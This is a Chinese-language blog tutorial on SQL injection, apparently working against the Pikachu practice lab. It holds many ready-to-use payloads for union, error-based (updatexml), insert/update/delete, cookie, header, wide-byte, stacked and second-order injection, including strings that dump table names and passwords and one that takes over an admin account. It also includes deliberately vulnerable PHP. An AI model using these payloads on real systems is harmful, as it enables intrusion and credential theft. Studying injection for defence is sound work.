---
layout: post
title: sql注入
date: 2026-04-18
tags:   sql注入
---

# SQL注入

## 一.网站原理

![alt text](/assets/images/05/image.png)

## 二.sql注入漏洞：
服务端没有对用户提交的数据进行过滤，黑客控制了你拼接的语句

## 三.代码层面

![alt text](/assets/images/05/image-1.png)


通过$query变量以及$_GET['name']函数等这样的东西把数据提交到后端
```
$name=$_GET['name']
```
```
$query="select id,email from member where username='$name'".
```
payload(攻击载荷)常用的有
```
xx' or 1=1#
```

![w](/assets/images/05/image-2.png)

我们把payload提交到这样的框框里面，就相当于吧payload替换到$name的位置，如下：
```
$query="select id,email from member where username='xx' or 1=1#'".
```
代码解释
```
#，空格--空格，是注释符，可以注释掉后面所有的代码，让他们不生效，以防你加入你的payload后语句不完整，报错
我们的payload是xx ' or 1=1#
xx后面的单引号和username='$name'里面前面的单引号配对
username='xx' or 1=1#'
导致后面出现了一个没有配对的单引号，这时候注释符#就发挥作用了，#可以注释掉后面的所有东西，那么这个单引号就完全不存在了，你也不要担心会把外层那个双引号注释掉，因为$query是个字符串，里面的#没有注释的功能，只是把他提交到数据库中，他才有注释功能。

```
效果如下：
![alt text](/assets/images/05/image-3.png)

## 四.注入位置
前端页面上所有提交数据的地方，不管是登录、注册、留言板、评论区、分页等等地方，只要是提交数据给后台，后台拿着该数据和数据库交互了，那么这个地方就可能存在注入点。

不管我们在客户端提交的数据，在http请求数据包的什么位置（post或者get），只要后台取出这个数据和数据库打交
道，都可能存在注入点

![alt text](/assets/images/05/image-4.png)

## 五.URL编码
url编码是一种将特殊字符串转换成%后接十六进制格式的技术
为什么要这样：服务端是通过键值对进行取值的取值的，但是如果值中间有特殊符号，就破坏了键值对的结构，后端就无法正常取数据了，这时候就要把特殊符号进行URL编码。

键值对
```
username = xiaoming
password = 123
age = 18
键 = 值（一起叫就叫键值对）
```
## 六.常用的简单测试语句和注释符号说明

sql语句的注释符号也是sql注入语句的关键点
```
#
 -- 
--+
--%20
```

get下
![alt text](/assets/images/05/image-6.png)
![alt text](/assets/images/05/image-7.png)
```
1、# 和 -- (有个空格)表示注释，可以使它们后面的语句不被执行。在url中，如果是get请求(记住是get请求)，也就是我们在浏览器中输入的url ，解释执行的时候，url中#号是用来指导浏览器动作的，对服务器端无用。所以，HTTP请求中不包括#，因此使用#闭合无法注释，会报错；而使用-- (有个空格)，在传输过程中空格会被忽略，同样导致无法注释，所以在get请求传参注入时才会使用--+的方式来闭合，因为+会被解释成空格。
2.当然，也可以使用--%20，把空格转换为urlencode编码格式，也不会报错。同理把#变成%23,也不报错。
```

post下
![alt text](/assets/images/05/image-8.png)
```
3.如果是post请求，则可以直接使用#来进行闭合。常见的就是表单注入，如我们在后台登录框中进行注入。
4.为什么--后面必须要有空格，而#后面就不需要？ 因为使用--注释时，需要使用空格，才能形成有效的sql语句，而#后面可以有空格，也可以没有，sql就是这么规定的，记住就行了。 因为不加空格，--直接和系统自动生成的单引号连接在了一起，会被认为是一个关键词，无法注释掉系统自动生成的单引号。
```

## 七.简单测试语句
```
1.引号测试，加了引号如果报错，证明存在注入点
 单引号闭合数据：$query="select id,email from member where username='vince'"; 用单引号测试,会报错，双引号测试查不到数据，不报错
 双引号闭合数据：$query='select id,email from member where username="vince"'; 用双引号测试，会报错，单引号测试查不到数据，不报错

报错≠查不到数据
报错：You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''''' at line 1
查不到数据：您输入的username不存在，请重新输入！

2.or 1=1 一个条件为真，即为真，真的效果就是查询到表中所有数据

3.where id=1 and 1=1 两个条件为真才为真，查询结果和不加1=1一样，and 1=2 一个条件为假，即为假，查询条件为假，什么数据也没有，两个结合起来可以判断是否存在注入点。

4.union select 联合查询  # 关系型数据库   redis非关系型的是不能用union select的
```
## 八.Union联合查询
通过前面的一张表去联合查询另外一个表
```
payload:xx' union select username,password from users#
```
```
select id,email from member where username='vince' union select * from user
可能会报错因为后面的那个表的列数可能超出第一个表查询的列数

select id,email from member where username='vince' union select username password from user
```
![alt text](/assets/images/05/image-5.png)

## 九. SQL注入分类
### 9.1 数据类型分类
数字型,字符型,搜索型,xx型,json型
#### 9.1.1 数字型
数字型注入的时候，是不需要考虑单\双引号闭合问题的，因为sql语句中的数字是不需要用引号括起来的
![alt text](/assets/images/05/image-9.png)

payload
```
1 or 1=1
```
tips:我们判断是否为数字型注入，不是通过前端页面上看到的数据是数字就判断它是数字型注入，也有可能是伪数字型，因为后台处理的时候可能是将前端传递过来的数字通过引号括起来了，也就是作为了字符串来处理，所以要多尝试。

#### 9.1.2 字符型

payload
```
xxx' or 1=1 #
```
![alt text](/assets/images/05/image-10.png)

需要调整phpstudy安全机制
安全机制：传入的数据里的特殊字符，会被自动加上反斜线 \ 转义
![alt text](/assets/images/05/image-11.png)

#### 9.1.3 搜索型
需要用到模糊匹配，%xx%，就是搜索包含xx的
```
mysql> select * from member where username like '%vince%' or 1=1;
```
payload
```
%xx%' or 1=1# 
```
![alt text](/assets/images/05/image-12.png)

#### 9.1.4 xx型
何为xx型呢？先看后台代码：
![alt text](/assets/images/05/image-13.png)

XX型是由于SQL语句拼接方式不同,不仅限括号，反正多试一下
```
mysql>select*from member where username=('vince')；
```

payload
```
XX') or 1=1#
```

#### 9.1.5 Json介绍

简单来说，json就是各个开发语言直接传输数据的数据格式，为什么要json呢，因为各个语言在处理数据时都有自己的一套标准或者说处理方式，不用语言之间的数据是不能互相使用的，比如js的字符串数据(请求体中的数据)交给python语言，python是不认识这个字符串的，所以大家互相传输数据的时候，就需要一个第三方数据格式，比如XMl或者json等，就相当于中介一样，大家先将自己语言中的数据转换为json格式的，再传递给其他语言，其他语言再通过json操作，将json数据转换为自己语言的数据类型，这样就可以进行后续处理了。

流程
![alt text](/assets/images/05/image-14.png)

前后端未分离项目（前后端代码写在一起）
![alt text](/assets/images/05/image-15.png)

前后端分离项目（前后端代码不写在一起，前端只进行展示，后端只进行数据查询）
![alt text](/assets/images/05/image-16.png)

#### 9.1.6 json注入
需要我们在火狐浏览器上安装一个hackbar插件

网站代码
```
<?php
  // php防止中文乱码
  header('content-type:text/html;charset=utf-8');
  
  if(isset($_POST['json'])){
    $json_str=$_POST['json'];
    $json=json_decode($json_str);
    if(!$json){
      die('JSON文档格式有误，请检查');
   }
    $username=$json->username;
    //$password=$json->password;
    // 建立mysql连接，root/root连接本地数据库
    $mysqli=new mysqli();
    $mysqli->connect('localhost','root','root');
    if($mysqli->connect_errno){
      die('数据库连接失败：'.$mysqli->connect_error);
   }
 
    // 要操作的数据库名，我的数据库是security
    $mysqli->select_db('pikachu');
    if($mysqli->errno){
      dir('打开数据库失败：'.$mysqli->error);
   }
 
    // 数据库编码格式
    $mysqli->set_charset('utf-8');
 
    // 从users表中查询username，password字段
    $sql="SELECT username,password FROM users WHERE username='{$username}'";
    $result=$mysqli->query($sql);
    if(!$result){
      die('执行SQL语句失败：'.$mysqli->error);
   }else if($result->num_rows==0){
      die('查询结果为空');
   }else {
        while($data=mysqli_fetch_assoc($result)){
            $username=$data['username'];
            $password=$data['password'];
            echo "用户名：{$username},密码：{$password}";
       }
   }
 
    // 释放资源
 $result->free();
    $mysqli->close();
 }
?>
```

正常查询
![alt text](/assets/images/05/image-17.png)

json注入
![alt text](/assets/images/05/image-18.png)
payload
```
json={"username":"xx' or 1=1 #"}
```
### 9.2 SQL注入提交方式分类
GET、POST、Cookie等

#### 9.2.1 cookie注入

Cookie 就是网站存在你浏览器里的一小段文本信息，用来记住你、识别你，是明文的

![alt text](/assets/images/05/image-19.png)
在admin后加入payload
```
' or 1=1#
```
但是可能无回显，因为服务端那边的代码可能并没有设计这个功能，那么就要用报错注入，后面会详细讲的

报错注入payload
```
' and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) 
#
```
![alt text](/assets/images/05/image-20.png)

会爆出数据库版本号，然后就用信息收集的知识，去找poc

#### 9.2.2 GET注入与POST注入
很简单，不说了，只要找到注入位置就行了，上面也提过

### 9.3 SQL注入请求数据位置分类
请求行,请求头,请求数据,cookie部分
![alt text](/assets/images/05/image-8.png)

#### 9.3.1 header（请求头）注入
例如
请求头中键值对 User-Agent (*)  
里面有客户端软件有关的信息。  
有些企业把这个也保存在了数据库中，也可能有注入点  
php 使用 $_SERVER['请求头键']拿到值  
$useragent = $_SERVER ['HTTP_USER_AGENT'];   

注意，这种 一般仅生存入数据，不会显示展示 所以用报错注入  
```    
or updatexml (1, concat (0x7e, version ()),0) or '    
```
每个请求头后都可以试一下  

### 9.4 mysql变量和函数
```
show globa variables; #查看变量
select @@version; #取出version
selecr @@xxxx; xxxx是变量名
```
内置函数
```
user(); #用户
version(); #版本
dattabases(); #库名
select xxx; #xxx是函数名
```

### 9.5 报错注入
场景：无回显信息  

条件：后台没有屏蔽数据库报错信息,在语法发生错误时会输出在前端，并且错误信息里面可能会包含库名、表名等相关信息。

#### 9.5.1 三个常用的用来报错的函数

1. Updatexml() :函数是MYSQL对XML文档数据进行查询和修改的XPATH函数。

```
UPDATEXML (XML_document, XPath_string, new_value);

它是一个内容替换函数，主要针对的xml数据：

第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc 

第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程，和正
则似的、也是做匹配用的，语法和正则不同而已。

第三个参数：new_value，String格式，替换查找到的符合条件的数据 。
```
```
比如：数据版本为5.5.53，那么concat连接之后，得到的结果为~5.5.53~
updatexml(1,~5.5.53~,1)，其中~5.5.53~并不符合xpath的语法格式，所以会报错
```
2. extractvalue() :函数也是MYSQL对XML文档数据进行查询的XPATH函数。
```
EXTRACTVALUE (XML_document, XPath_string);

第一个参数：XML_document是String格式，为XML文档对象的名称

第二个参数：XPath_string (Xpath格式的字符串)

concat:返回结果为连接参数产生的字符串。
```
```
例如：SELECT ExtractValue('<a><b>hello</b></a>', '/a/b'); 就是寻找前一段xml文档内容中的a节点下的b节点，这里如果Xpath格式语法书写错误的话，就会报错。这里就是利用这个特性来获得我们想要知道的内容。
```
3. floor() :MYSQL中用来取整的函数。（用的不多）

例子
```
select updatexml(1,concat(0x7e,(select version()),0x7e),1);

第一个和第三个参数随便写，cancat()是连接字符串函数，0x7e是~的16进制编码（防止因为添加引号而出现不必要的错误）
他是优先执行最内层括号的函数的，select（version），所以先显示版本然后报错
```
#### 9.5.2 实战测试
1.爆数据库版本信息
```
k' and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) #
```
上面整句话的意思是，执行updatexml函数，匹配1这个数据中符合这个匹配规则 ~数据库版本~ 的数据，并替换为1，那么很明显，啥也匹配不到，而且报错
![alt text](/assets/images/05/image-21.png)

2.爆数据库当前用户
```
k' and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)#
```

3.爆数据库
```
k' and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) #
```

4.爆表
```
k'and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='pikachu')),0)#
```
但是反馈回的错误表示只能显示一行，所以采用limit来一行一行显示
![alt text](/assets/images/05/image-22.png)
```
k' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='pikachu' limit 0,1)),0)#
更改limit后面的数字limit 0完成表名遍历。
前面那个数字表示第几行，后面表示共几列
```

5.爆字段（列）
```
k' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users' and table_schema='pikachu' limit2,1)),0)#
```
information_schema.columns为什么这样写，这里表示跨库查询，我们使用的是pikuchu库

6.爆字段内容
```
k' and updatexml(1,concat(0x7e,(select password from users limit 0,1)),0)#
```
返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL。

### 9.6 SQL注入查询语句分类
select、delete、update、insert，也就是增删改查。

select不用多说，前面一直在用。

其实insert\update\delete等也是mysql的函数。

#### 9.6.1 insert注入

就是前端**注册**(或者提交)的信息最终会被后台通过insert这个操作插入数据库，后台在接受前端的注册数据时没有做防SQL注入的处理，导致前端的输入可以直接拼接SQL到后端的insert相关内容中，导致了insert注入。

点击注册，来到注册页面，输入注册信息，然后通过Burp抓包在用户名输入相关payload，格式如下：
![alt text](/assets/images/05/image-23.png)

在jaden后面加payload

1.爆表名
```
'or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='pikachu' limit 0,1)),0) or'
```
末尾不能加#因为你也看见了，后面还会有其他别的数据也要提交，所以用了or

insert语法：insert into member (username,pw,sex,phonenum,email,address) values('jaden',123456,1,2,3,4);

insert into member (username,pw,sex,phonenum,email,address) values('jaden'or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='pikachu' limit 0,1)),0) or'',123456,1,2,3,4);

or后面的那个单引号就是用来闭合insert语法里面的单引号

2.爆列名
```
' or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users'limit 2,1)),0) or'
```

3.爆内容
```
' or updatexml(1,concat(0x7e,(select password from users limit 0,1)),0) or'
```

#### 9.6.2 update注入

与insert注入的方法大体相同，区别在于update用于用户登陆端(或者修改数据的地方)，登录端一般说的是修改最后一次登录时间等信息，insert用于用于用户注册端。

![alt text](/assets/images/05/image-24.png)

![alt text](/assets/images/05/image-25.png)

上面我们看到有四个数据发送到了后台，但是目前不知道哪个是注入点，需要一个个的测，经测试发现手机号有个注入点：

```
' or updatexml(0,concat(0x7e,(select database())),0) or'
```

#### 9.6.3 delete注入

般应用于前后端发贴、留言、用户等相关删除操作，点击删除按钮时可通过Brup Suite抓包，对数据包相关delete参数进行注入，一般普通的用户是没有权限删除数据的，管理员才行。

![alt text](/assets/images/05/image-26.png)

![alt text](/assets/images/05/image-27.png)

![alt text](/assets/images/05/image-28.png)

在id=56后面加payload
```
or updatexml(2,concat(0x7e,(database())),0)
```
但是由于是get请求，需要对特殊符号进行url编码
```
%20or%20updatexml(2,concat(0x7e,(database())),0)
```

### 9.7 宽字节注入

为了防止sql注入在php.ini中添加 magic_quotes_gpc=on或使用一些转义函数，如：addslashes和mysql_real_escape_string，他们转义的字符是单引号 (')、双引号 (")、反斜杠 (\) 与 NULL，方式是在前面加 \，注释掉。

斜杠的URL编码是%5C

XX' or 1=1# 会被转为 XX%5C%27...

如果是GBK编码是一个繁体中文字（我这里显示不出来也就是说在单引号前加个%df就可以把（\）吃掉变为繁体字那么就会保留 (')。 
```
xxx%27+or+1%3D1+%23

```

但是不能推到 UTF8，因为他不能改成一个汉字编码，没这样的组合。

![alt text](/assets/images/05/图片-1.png)


## 十. 偏移量注入

原理：
偏移注入是一种注入姿势，可以根据一个较多字段的表对一个少字段的表进行偏移注入，一般是联合查询，在页面有回显点的情况下。偏移注入现在用的不多了，因为有时候不太好用昂，示例中有提及。在SQL注入的时候会遇到一些无法查询列名的问题，比如系统自带数据库的权限不够而无法访问系统自带库。当你猜到表名无法猜到字段名的情况下，我们可以使用偏移注入来查询那张表里面的数据。

场景
1. 联合查询
2. 前面的表列数多于后面的
3. 服务端之战是其中几列
4. 知道注入的表名，但是不知道列名

```
select * from menmber union select *from users;
```
会报错，因为前面有7列，后面有4列
![alt text](image-31.png)
```
select 1,2,3;
```
效果如下  
![alt text](image-29.png)

你单独执行这个语句会多出三行，又因为后面那个表列数比前面少3个所以
```
select * from menmber union select *,1,2,3 from users;
```
然后就对应上了  
![alt text](image-30.png)

你执行了这个代码，可能也不会把所有的7列全部展示出来，因为可能服务端那边做了相应的限制，假设服务端只显示了username和email列，那么显示的union联合查询的表的列也是相对应的username和3

为了尽可能显示多的列数，我们可以调整*，1，2，3这几个数字的位置，来实现不同的对应，但是很难避免就是有那么几列对应不上，所以很局限
```
select * from member union select 1,2,3,user.* from users;
```
tips：如果*号不是在首位要写成上面那样，相当于是跨库

其实前面非union查询的表我们也可能不知道列数，那么我们可以
```
select * from member union select 1,2,3,4····;
```
不断去添加数字，当不报错时，就试出来了


## 十一. 其他注入手法

### 11.1加密注入 
js加密流程
![alt text](image-32.png)

是为了防止中间人抓包看到密码

抓包的时候我们会抓到username=asdfasdf,但是如果payload
```
asdfasdf or 1=1#
```
那么服务端会把asdfasdf or 1=1#整体解密，显然解密出来的东西没啥用
所以应该直接在输入框内写jaden or 1=1#整体加密（不抓包），若是用抓包的话，找到js加密方法（例如base64编码）把admin' or 1=1#整体加密在发送，难在知道是怎么加密的

js代码在js代码中进行分析，找加密逻辑

### 11.2堆叠注入
堆叠就是可以让多个sql语句连在一起，分号后面可以再加sql语句
如果可以堆叠查询就可以尝试堆叠注入
与union联合注入的区别在于union的语句类型是有限的，只能察，看，而堆叠注入是任意的，可以增，删，改，查，
堆叠注入只能显示第一条sql语句的信息，不返回后面的，因此在读数据时，用union，同时在使用堆叠注入之前，我们也是需要知道
一些数据库相关信息的，例如表名，列名等信息。

堆叠注入的使用条件十分有限，一旦能够被使用，将对数据安全造成重大威胁。
```
select * from users;insert into xssblind values(1,'2026',"xxx",""xiaoming")
```
限制：不是所有的数据库都支持
mysql有些AIP(函数)是支持的  
sqlserver都支持  
oracle都不支持  
![alt text](image-33.png)

![alt text](image-34.png)

### 11.3二次注入

这个漏洞基本上黑盒测试是很难发现的，基本都是代码审计出来的，找程序代码中操作数据库中数据的地方，看一下从数据库中取出的数据是否进行了脏数据过滤。  

二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句
所导致的注入。

二次注入的原理，以php代码来举例，在第一次进行数据库插入数据的时候，仅仅只是使用了addslashes 或者是借助 **get_magic_quotes_gpc** 对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，比如单引号数据，虽然直接注入时效了，但是数据写入到了数据库，数据库中存的这个数据本身还是脏数据。在将数据存入到了数据库中之后，很多开发者都会认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。

![alt text](image-35.png)

示例：
![alt text](image-36.png)
![alt text](image-37.png)
你注册了一个用户：admin'#，密码：123
脏数据admin'#被写入了数据库，数据库默认这个数据是安全的
当你更新密码时，把123，改为666
会执行
```
update users set password='$pass' where username='$username' and password='$currentpass'
update users set password='666' where username='admin'#' and password='123'
```
#后面全部被注释，所以就完成了对admin用户密码的更改，然后你就可以登录admin，admin一般是管理员用户


### 11.4 中转注入
把参数中转一下，再发送到指定网址上去，可以对请求携带的数据进行二次加工。

就是抓包后修改数据在提交

### 11.5 伪静态注入

可以自己学一下什么是伪静态网站，简单来说就是把动态网站伪装成静态网站，在url界面是可以进行数据交互的


![alt text](image-38.png)

静态显示的：http://192.168.61.149/thread-1-1-1.html  

通过规则：rewrite ^([^\.]*)/thread-([0-9]+)-([0-9]+)-([0-9]+)\.html$ $1/forum.php?mod=viewthread&tid=$2&extra=page%3D$4&page=$3 last;

实现动态访问：http://192.168.61.149/forum.php?mod=viewthread&tid=1&extra=page%3D1


后台提取到你的url，然后通过正则匹配，提取其中的一些数据，然后构建成一个新的url，然后跳转到新的界面，完成数据交互

我们只要在伪静态的参数部分（-1-1-1）加入payload就可以了


